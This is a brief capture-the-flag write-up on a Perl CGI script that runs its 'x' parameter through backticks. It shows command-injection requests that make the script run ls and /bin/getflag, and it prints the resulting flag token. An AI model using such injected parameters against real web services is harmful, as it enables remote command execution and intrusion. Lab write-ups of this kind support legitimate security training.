# Solution

So once we loged in, we see a level04.pl which is a perl program setuid here is the program.

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The important part is this line **print `echo $y 2>&1`;** in perl the back tick will execute a command the $y is the variable,
from the parameter x so the call to the proper uri will look like this:

```sh
curl localhost:4747?x=;ls
```

the result will be the ls execution, so basically we need to use the leverage of param x and load getflag result in $y.

Here is the result:

```sh
curl localhost:4747?x='$(/bin/getflag)'
```

this will be the result of the command above:

```sh
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
